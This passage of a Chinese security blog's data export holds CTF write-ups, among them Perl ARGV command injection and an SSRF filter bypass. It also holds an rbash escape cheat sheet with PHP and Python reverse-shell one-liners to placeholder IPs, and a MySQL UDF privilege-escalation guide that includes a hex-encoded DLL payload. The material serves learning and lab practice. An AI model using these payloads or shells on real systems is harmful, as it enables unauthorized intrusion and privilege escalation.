http.StatusInternalServerError) return } var data []byte if path != \"\" { data = readfile.ReadFile(path) } else { data = []byte(\"请传入参数\") } c.JSON(200, gin.H{ \"success\": \"read: \" + string(data), }) } else { c.String(200, \"Hello, User. How to become admin?\") } } readfile.go package readfile import ( \"os/exec\" ) func ReadFile(path string) (string2 []byte) { defer func() { panic_err := recover() if panic_err != nil { } }() cmd := exec.Command(\"bash\", \"-c\", \"strings \"+path) string2, err := cmd.Output() if err != nil { string2 = []byte(\"文件不存在\") } return string2 } 看了一波感觉是session伪构造，其中要求我们的name为admin才能有读取flag的权限，但是session.name是加密过的： var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) 这里看到是以session_key密钥加密，这时候神奇的思路就来了，佬们都直接盲猜题目没有该环境变量，于是想着直接搭建到本地运行得到session，在此之前我们看一下这个 可以看到我们当前的name为User根据上述index处的代码我们知道当name=nil的时候，才会赋值为User，这说明在此之前我们的name一定是nil，此时如果我们修改这个代码 session.Values[\"name\"] = \"User\" 改为 session.Values[\"name\"] = \"admin\" 那此时运行完之后我们的session.name一定是admin，思路打通了，那直接本地搭建即可 这里也是搭建了很长时间，一直报错。。。但功夫不负有心人还是搭建好了 MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg== MTY5ODc1NDk2OHxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRlZ6WlhJPXzzzlJr4E_S8XnoBRbpogEHKAVkSrz_YsNvqNpca0wA6g== MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg== 我们访问127.0.0.1:8000得到session，如上所示，最后看一下readfile函数 这里看了wp发现filename是get传参，然后是一个正则过滤 MISC 签到题 发现是base128，两次base64解码即可","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"i-got-id-200","path":"/2023/10/01/i-got-id-200/","content":"题目描述 csaw-嗯。。我刚建好了一个网站 题目解题 访问首页是三个链接 ，点击查看发现只有第二个和第三个有利用的可能，第二个为一些文本框 第三个为文件上传 这里文本框不知道有啥利用的（测试了半天） 于是看一下文件上传，首先上传php没反应，那上传普通的看看 测试几番发现只要是普通文件以及普通内容（即不包含木马什么的）那该文件内容是什么，页面就会显示什么 再者看了看url发现每个页面都有.pl后缀，百度发现这代表的是perl语言文件。但无奈菜鸡的我对此不懂，只能跟着佬的wp走了 首先抓包以方便测试，接上回，由于页面回显的就是文件所写的内容，因此某些大神就直接猜到了后台代码，这里先附上： use strict; use warnings; use CGI; my $cgi= CGI-&gt;new; if ( $cgi-&gt;upload( 'file' ) ) { my $file= $cgi-&gt;param( 'file' ); while ( &lt;$file&gt; ) { print \"$_\"; } } 因为它会将上传的文件内容打印出来，所以猜测后台存在param()函数。param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。 如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的。我们不猜代码，一步步来： 复制下面一遍代码，将filename删去，内容修改为ARGV，读取file.pl看看有什么（就猜它在/var/www/cgi-bin/下！）同时修改POST地址后的参数，作为要读取的文件，如图： 我么可以看到回显源码，果然验证了有param()函数的猜想。 利用bash读取一下主目录有啥文件 /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| %20是空格，原始命令为：/cgi-bin/file.pl?/bin/bash -c ls${IFS}/|，为什么这么构造？后面有解释，先看效果： 看到flag，直接读取 疑点回顾 何为/bin/bash -c？ /bin/bash -c表示指定将命令转为一个完整命令执行，可以理解为执行linux命令 例： 何为${IFS}？ IFS是shell的特殊环境变量,是Linux下的内部区域分隔符。IFS中存储的值可以是空格、制表符、换行符或者其他自定义符号，可以在linux中使用${IFS}代替空格 例： 为什么要加|？ |：管道符左边命令的输出就会作为管道符右边命令的输入，这里为什么要加我也没搞明白，如有知道的朋友评论告诉我，谢谢。 举例一个常见的用法吧：cat后输出的内容，作为|后面内容的输入，这里是交给grep执行（此处在后面有解释） 注：经测试，${IFS}和/bin/bash联用时，不代表空格 自行做测试后发现${IFS}被识别为根目录符号，但是不知道为什么会这么识别，另外管道符|，我认识是需要将内容作为ARGV的输入打包，用于显示出查找的内容个。 漏洞分析 这里大佬告诉我们要利用@ARGV这个全局变量 首先要了解Perl中的ARGV全局特殊文件句柄 ARGV：遍历数组变量@ARGV中所有文件名的特殊文件句柄 @ARGV：是个全局数组特殊变量，传给脚本的命令行参数列表 Perl 会将 perl 命令行参数列表放入到数组 @ARGV 中，而默认情况下，这些命令行参数是 Perl 的数据输入源，也就是 说Perl 会依次将他们当作文件进行读取。这里可以参考C语言的argv{}数组，但不同的是，Perl语言的@ARGV中的第一个变量就是参数，而不是文件名。 Param() 函数会返回一个列表，但只有第一个文件会被放到变量中。 增加新的上传项，并删除filename，重大漏洞来了 删除filename后， $file的值（也就是文件名）变为了上传的内容，而输出的文件内容为空 通俗理解就是，新加入的文件内容替换了filename参数，传给了$file变量，句柄中打开文件内容为空 那如果我们利用@ARGV，将$file替换为@ARGV，其句柄就是命令行的参数， 如果给的参数是文件名，就可以输出第一个文件名的所有内容。 这里我们利用以上信息构造，加入新的文件列表，删除filename，文件内容写入ARGV 那么后端执行，就会把$file的值换为ARGV，也就成了上述test.pl的内容，会把从命令行里读取到的参数，当作文件路径找到并输出。 那么如何传入命令行参数呢？其实直接在url参数给出，就相当于命令行传参 那么，通过ARGV和url的参数就可以达到读取服务器上任意文件的目的构造远程执行代码 这里空格需要用url编码转义，否则不符合http头部格式，不能随便加空格的 Linux中，/bin/bash 是bash解释器，这句话当作文件名时，首先会去寻找/bin/bash并且输出，那就是执行了解释器的功能 bash -c 的语法是，后面跟的第一个参数会当作命令来被bash解析，第二，第三个参数被认为是bash的参数，而不是第一个参数（命令）的参数 举个例子： bash -c ls / 如果我们想要列出根目录需要 “ls /”时，需要加入$IFS IFS是linux的特殊变量，默认值是space空格， $是取变量值，$IFS就代表空格 就可以执行“ls /“的命令了 若只有 /bin/bash%20-c%20ls$IFS/ 命令会发现没有返回信息 因为，/etc/passwd本身就是文件，后端代码找到并输出返回在html标签中 而/bin/bash 一旦被访问输出，就是bash运行环境，整个语句的输出结果在shell的缓冲区里，也就是后台服务器才能看到，并不会输出到html标签中。在linux里我们只需要管道操作就可以指定结果的存放位置了。 Tips：Perl open()函数会默认打开一个管道！ 这里利用Perl open()函数打开的管道，进行劫持，通过“|“操作符，把内容引 入open()函数已经打开的管道中，就可以输出到html标签中啦！ 以上都是佬的探索，只能说太秀了，我也懵逼了┭┮﹏┭┮ 参考文章 攻防世界web进阶区i-got-id-200超详解 xctf攻防世界 Web高手进阶区 i-got-id-200","categories":["攻防世界"]},{"title":"题目名称-SSRF Me","path":"/2023/10/01/ti-mu-ming-cheng-ssrf-me/","content":"题目描述 信通院 题目解题 ![image-20231001163842989](题目名称-SSRF Me/image-20231001163842989.png) 首先看页面有两个输入框，一个为输入url地址，一个为输入正确的验证码，这里我 用127.0.0.输入了几次没什么反应，页面只是重新刷新了，因此借鉴wp思路我们爆破一下md5值，找到后六位符合该验证码的值即可 &lt;?php $captcha=0; while(true) { if(substr(md5($captcha), -6, 6) == \"f51ae7\") //f51ae7会变 { echo $captcha; break; } $captcha++; } ?&gt; ![image-20231001164159239](题目名称-SSRF Me/image-20231001164159239.png) 我们带入输入框看看 ![image-20231001164228097](题目名称-SSRF Me/image-20231001164228097.png) 如图发现成功输入后页面出现第二个输入框，我猜测这个url地址访问的就是此页面。那我们刷新一下进行伪协议读取看看 ![image-20231001164451882](题目名称-SSRF Me/image-20231001164451882.png) file伪协议读取 发现成功读取，随后尝试读取flag：file:///flag ![image-20231001164842551](题目名称-SSRF Me/image-20231001164842551.png) 发现被过滤了，随后看了wp发现，佬的思路为：他猜测输入的url地址被拼接到url网址上去了，因此他尝试进行url编码来绕过。 file:///%66%6c%61%67 ![image-20231001165120145](题目名称-SSRF Me/image-20231001165120145.png) 成功读取 但这里我产生了一个疑问：为何file本身不能编码，只对flag编码（我如果将其全部进行url编码会如何？），但由于此问题网上很难找到，因此 我就询问了GPT： 是的，如果你对 `file` 伪协议本身进行编码，那么系统通常会无法正确识别它，因为 `file` 伪协议是一个特殊的协议标识符，它不应该被 URL 编码。 `file` 伪协议是用于指示访问本地文件系统的机制，通常使用如下格式： ``` file:///path/to/your/file.txt ``` 在这个示例中，`file` 是伪协议的标识符，表示你要使用本地文件系统。如果你对 `file` 进行了 URL 编码，将会导致该标识符不再被系统正确识别，可能引发错误或无法访问文件。 因此，通常情况下，只需要对文件名或路径中的特殊字符进行 URL 编码，而不需要对 `file` 伪协议本身进行编码。这可以确保 `file` 伪协议的标识符能够正确地被系统解析和识别。 总而言之，原因似乎在与file如果被url编码，系统则无法正确识别file伪协议而引发错误。 参考文章 攻防世界之SSRF ME详解 【愚公系列】2023年06月 攻防世界-Web（题目名称-SSRF Me） 也可以看官方wp，讲的是在读取到关键文件信息后，发现另一个内网端口，访问后发现是一个命令执行页面，但由于执行命令后发现其靶机不出网，故选择bash盲注，但我也不清楚该知识点","categories":["攻防世界"]},{"title":"Linux提权学习之rbash逃逸","path":"/2023/09/27/linux-ti-quan-xue-xi-yi/","content":"0x01 前言 本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~ 0x02 rbash简述 1、什么是rbash 它与一般shell的区别在于会限制一些行为，让一些命令无法执行 2、如何设置一个rbash cp /bin/bash /bin/rbash # 复制一个bash，重命名为rbash useradd -s /bin/rbash test # 设置用户test登陆的shell为rbash mkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令 3、使用场景 Linux Restricted Shell是一种限制命令(如：cd、ls、echo等)、阻止环境变量（如：shell、path、user），甚至于阻止管道/重定向（如：&gt;，&gt;&gt;，|）的shell。 常见的Linux Restricted Shell有rbash、rksh、rsh。 Linux Restricted Shell有如下场景使用 1. 提高系统安全性 2. 阻止黑客执行高危命令 3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令 4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub 0x03 信息搜集 这里我们主要是通过信息搜集来确定当下的rbash环境下可以执行那些命令，以及环境信息。 1. 检查可用的命令，如：cd、ls、echo等 2. 检查运算符，如：&gt;、&gt;&gt;、|、&lt;等 3. 检查可用的编程语言，如：php、perl、ruby、python等 4. 哪些命令可以作为root (sudo -l)运行 5. 检查具有SUID perm权限的文件或命令 6. 检查当前使用的shell：echo $shell 7. 检查环境变量：运行env、printenv、set等 通过以上操作,我们已收集到一些有用的信息，接下来尝试一下通用的利用方法。 0x04 常用逃逸命令 1. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash 2. 如果允许使用cp命令，则可以复制/bin/sh或者/bin/bash到当前目录 3. 使用ftp进行命令执行，执行 !/bin/sh 4. 使用gdb进行命令执行，执行 !/bin/sh 5. 使用more/man/less进行命令执行，执行 !/bin/sh 6. 使用vim进行命令执行，执行 !/bin/sh 7. 使用rvim执行:python，然后运行import os; os.system(\"/bin/bash ) 8. 使用scp，通过scp来传入自己脚本 9. 使用awk，执行awk 'BEGIN {system(\"/bin/sh or /bin/bash\")}' 10. 使用find，执行find / -name test -exec /bin/sh or /bin/bash \\ 4.1 如果允许使用“/” 则可以运行/bin/sh、/bin/bash 4.2 如果允许使用cp命令 则可以复制/bin/sh到当前目录，不过这里我没有复现成功cp /bin/bash，应该是环境条件不允许吧。—下面有补充 4.3 使用ftp进行命令执行 执行 !/bin/sh 如上图所示的ftp命令 4.4 使用gdb进行命令执行 执行 !/bin/sh 不过前提就是该环境下有gdb环境 4.5 使用more/man/less进行命令执行 执行 !/bin/sh 这里那些文章介绍的不清楚，我复现了一下发现还是需要某种条件：也就是你当前目录下有足够大的内容的文本，这样more读取的时候才会体现出分页读取的效果，进而你可以直接输入!/bin/sh 如图less不必非得读取内容多的文件 man似乎直接输入man man即可 4.6 使用vim进行命令执行 执行 !/bin/sh 4.7 使用rvim执行python python import os; os.system(\"/bin/bash\") 这里不知为何提示我在rvim中无法执行shell命令/禁止使用命令。 但也可能是我不会操作吧。。。。 4.8 使用scp传入自己的脚本 这里未复现 scp -S /path/yourscript x y: 目标机器连接 kali 利用 ssh 将 exp 下载到靶机上来 scp &gt;root@192.168.26.20:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/ #靶机上执行 用户名和 IP 是 kali 的 scp /path/local_filename username@IP:/path #kali 上执行 用户名和 IP 是靶机的 涉及到的提权方式： **Tips：**拿到一个本地普通用户后，往往先要在该用户的家目录下搜索一番，以寻找有用的信息，提权的时候几乎所有的文件操作都在 tmp 目录下，因为其他目录往往没有权限，所以要时刻注意自己当前所在的目录。 find / -user root -perm -4000 -print 2&gt;/dev/null #发现具有 suid 权限的命令 4.9 使用awk命令执行 执行awk 'BEGIN {system(\"/bin/sh or /bin/bash\")}' 不过这里更推荐使用一种，我这个环境不知为何使用不了bash，估计是我之前修改了吧 awk 'BEGIN {system(\"/bin/sh\")}' 4.10 使用find执行命令 这里也是使用其中一个 这里看了几篇文章，我再补充一下上述的cp命令： 4.11 补充 1、cp /bin/bash到本地用户目录 cp /bin/bash test1 cp /bin/sh test2 ./test1 # 切换到了/bin/bash ./test2 # 切换到了/bin/sh 执行：git &gt; git help status --这里说git也可，但我没有找到方法 2、set shell DC-2靶机使用它成功了 在一些编辑器中可以设置shell变量然后执行，如vim中 # vim/vi进入之后 :set shell=/bin/sh # 或者用/bin/bash :shell # 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令 export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ 3、更改PATH或SHELL环境变量 执行：export -p # 查看系统的环境变量设置 PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash 0x05 编程语言逃逸 5.1 Python python -c \"import os;os.system('/bin/bash')\" 或者 python -c \"import pty;pty.spawn('/bin/bash')\" 5.2 PHP php -a then exec(\"sh -i\") 5.3 perl perl -e \"exec '/bin/sh';\" 5.4 lua os.execute('/bin/sh') 5.5 Ruby exec \"/bin/sh\" 5.6 except except spawn sh then sh. 不过这些编程语言的用法未曾复现，我发现在kali上输入的时候没反应，估计是环境不匹配吧。暂作记录 0x06 高级技术 6.1 ssh 1.ssh username@IP -t \"/bin/sh\" or \"/bin/bash\" 2.ssh username@IP -t \"bash --noprofile\" 3.ssh username@IP -t \"() { :; }; /bin/bash\" (sehllshock) 4.ssh -o ProxyCommand=\"sh -c /tmp/yourfile.sh\" 127.0.0.1 (SUID) 6.2 zip zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\" 6.3 tar tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash 6.4 pico 执行pico -s \"/bin/bash\"，然后写入/bin/bash，并且执行CTRL+T 这里复现了一波，步骤为直接输入pico -s \"/bin/bash\"，然后按ctrl+o会让你编写文件名，文件名随意写，接着按ctrl+t，然后执行你想要的命令如whoami，id等等即可 6.5 环境变量修复 获取到的Shell，环境变量可能会缺失，在这里可以通过如下命令进行修复 export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin 0x07 简单实战 7.1 创建测试用户 使用具有sudo特权的用户创建一个新测试用户 useradd -m test -s /bin/rbash ## 创建一个用户名为test，并且设置test登录shell为rbash passwd test ## 为test设置密码 这里密码为123456 7.1.1 为新用户建立目录 mkdir /home/test/bin 7.1.2 指定用户可以运行的命令 为用户指定可以运行的命令，创建指向新建目录链接。指定用户可以运行mkdir``ls``ping ln -s /bin/bash /bin/rbash ## 从Bash 创建一个名为rbash的符号链接 ln -s /bin/mkdir /home/test1/bin ln -s /bin/ls /home/test1/bin ln -s /bin/ping /home/test1/bin 7.2 rbash逃逸 7.2.1 切换用户时逃逸 这里的原理涉及到su 和 su- 的区别： su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的 su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了 逃逸： su -l test1 su - test1 su --login test1 这里我并未复现成功，就先看个图吧 7.2.2 ssh登录时逃逸 （借助-t远程在远程机器上运行脚本） ssh username@IP -t \"/bin/sh\" or \"/bin/bash\" ssh username@IP -t \"bash --noprofile\" ssh username@IP -t \"() { :; }; /bin/bash\" ###shellshock 7.2.3 当前shell中逃逸 7.2.3.1 特殊情况 [1] / 被允许的情况下；直接 /bin/sh 或 /bin/bash [2]能够设置PATH或SHELL时 export PATH=$PATH:/bin/:/usr/bin:$PATH export SHELL=/bin/sh [3]权限足够时 cp /bin/sh /path/ ;sh 或 cp /bin/bash /path/ ;sh 7.2.4 利用系统常见应用逃逸 [1]ftp [2]more [3]less [4]man [5]vi [6]vim 以上在输入的地方输入!/bin/sh 或 !/bin/bash 7.2.5 利用用户安装应用逃逸 1、ed-editor ed !'/bin/sh' 2、git git help status !/bin/bash 3、zip zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\" 4、tar tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash 7.2.6 利用编程语言环境绕过 1、python python -c 'import os; os.system(\"/bin/sh\")' 这里也是解密了，原来是在真实情况下才可以。。。 2、php php -a then exec(\"sh -i\"); 这里仍未复现成功，它提示我语法错误？？？不理解 使用PHP反弹设shell绕过 攻击机开启监听``nc -lvp PORT``目标机建立连接``php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 3、perl perl -e 'exec \"/bin/sh\";' 4、lua os.execute('/bin/sh') 同PHP。。。估计真是语法问题？ 5、ruby exec \"/bin/sh\" 6、expect spwan sh sh 0x08 tips: 8.1 比rbash更容易遇到的问题是当前路径异常问题 echo $PATH ###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证 export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ####修复 8.2 不能使用 &gt; ，&gt;&gt;等字符重定向写文件：echo ‘script code’ | tee scriptfile 8.3 su切换用户逃逸时还可以在切换用户时执行spawn shell命令 su -c \"python -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\" test1 8.4 ssh 登录时同样可以通过spawn shell逃逸 ssh username@IP \"export TERM=xterm;python -c 'import pty;pty.spawn(\\\"/bin/bash\\\")' 8.5 编程语言绕过的利用，还可以使用反弹shell到我们攻击机的方式进行逃逸，以python为例： python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LISTENING IP\",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 8.6 上边用的比较多的是 !/bin/sh 和 !/bin/bash;其实还有一个 !‘sh’ —&gt;由于没有了 ‘/’ ；有时候能够达到很好的绕过效果 8.7 同理在路径正确的情况下，在当前rbash中直接输入 sh 也能够完成逃逸( !/bin/sh 和 !/bin/bash 逃逸失败报错同[6] ) 0x09 总结 这次也就是简单的演示了一下各种情况，毕竟环境配置也很难很烦，因此就草草了事，只需要记得有这些姿势即可，在实战时遇到问题在对应解决。 上述这些逃逸方式应用到其他类型的restricted shell中也是可以的，由于不同系统特性不同，逃逸的方式也有很大差异；再就是用户限制的宽松程度不同，我们能够逃逸的方式也不同；用户安装的git、tar、zip等应用也能够给予很大的帮助；总之就是要多尝试，灵活应用！！！ 0x10 参考文章 【安全】Linux Restricted Shell 绕过指南 [渗透技巧——如何逃逸Linux的受限制shell执行任意命令 ] 【渗透测试】— rbash逃逸方法简述 rbash逃逸大全 Restricted Bash绕过技巧 --建立rbash环境可参考 DC 系列靶机知识点总结","tags":["Linux提权"],"categories":["内网渗透"]},{"title":"权限提升学习","path":"/2023/09/25/windows-ti-quan-xue-xi-er/","content":"0x01 前言 本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。 最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！ 0x02 MySQL-udf 提权 2.1 简介 UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。 udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。 2.2 利用条件 1. 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\\plugin文件夹下） 2. 从udf文件中引入自定义函数(user defined function) 3. 执行自定义函数 mysql用户权限问题 获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。 拥有将udf.dll写入相应目录的权限。 数据库版本问题 udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同： 版本 路径 MySQL &lt; 5.0 导出路径随意； 5.0 &lt;= MySQL&lt; 5.1 需要导出至目标服务器的系统目录（如：c:/windows/system32/） 5.1 &lt; MySQL 必须导出到MySQL安装目录下的lib\\plugin文件夹下 一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）不过这种方法暂未见过。 2.2.1 常规情况： 1. mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）； 2. CREATE权限、FILE权限（root用户默认拥有所有权限）。 首先基础语法查询是否 secure_file_priv 没有限制 Value 说明 NULL 不允许导入或导出 /tmp 只允许在 /tmp 目录导入导出 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 2.2.2 特殊情况： INSERT权限； UPDATE权限； DELETE权限。 查看当前数据库用户权限： 我们进入mysql所在的bin目录下打开cmd输入账号密码登录数据库 select * from mysql.user where user = substring_index(user(), '@', 1)\\G; 可以看到当前用户的权限情况，Y代表有对应的权限 2.3 版本特性 udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同： 1、 Mysql &lt; 5.0 导出路径随意。 2、 5.0 &lt;= Mysql &lt; 5.1 Win2000导出路径： C:/Winnt/udf.dll 其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll 3、 Mysql &gt;= 5.1 Mysql安装目录的lib\\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\\plugin目录大概率是不存在的，需要自行创建。 由于这里还得搭配环境，我这里选择在虚拟机上下载小皮（自带mysql） 搭建成功！ 2.4 UDF文件位置 1、sqlmap： sqlmap\\data\\udf\\mysql 2、metaspliot： /usr/share/metasploit-framework/data/exploits/mysql 2.5 操作步骤 1、查看可导出文件位置 这里看到我是NULL很明显不能利用了，因此我跟着网上文章改了一下配置为空，方便接下来操作 2、查看当前数据库用户权限 select * from mysql.user where user = substring_index(user(), '@', 1)\\G; 可以看到有几个关键的权限 Select_priv: Y Insert_priv: Y Update_priv: Y Delete_priv: Y 3、确认mysql安装位置 4、通过主机版本及架构确认mysql位数来选用udf文件 此处显示为Windows 64位操作系统 show variables like '%compile%'; 5、查看数据库版本，判断udf文件写入位置 5.1 mysql大于5.1版本时 查看 plugin 目录，存在lib\\plugin目录且有webshell时，直接上传udf文件。 查看 plugin 目录，存在lib\\plugin目录但没有webshell时，则需要以16进制编码写入udf文件。 很明显我们这里的情况是后者 5.1.2 sqlmap udf文件解码 ​ 首先将对应版本的udf文件进行16进制编码（sqlmap中的udf文件为防止误杀默认是经过异或编码的，需先使用sqlmap自带的脚本解码）。 python3 extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 5.1.3 16进制编码udf文件 select hex(load_file('C:\\\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\\\lib_mysqludf_sys.txt'; 5.1.4 udf写入plugin目录 将16进制编码后udf文件使用dumpfile函数写入磁盘（outfile导出文件会在末尾写入新行且转义换行符，破坏二进制文件结构，dumpfile不会进行任何操作）。 select 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D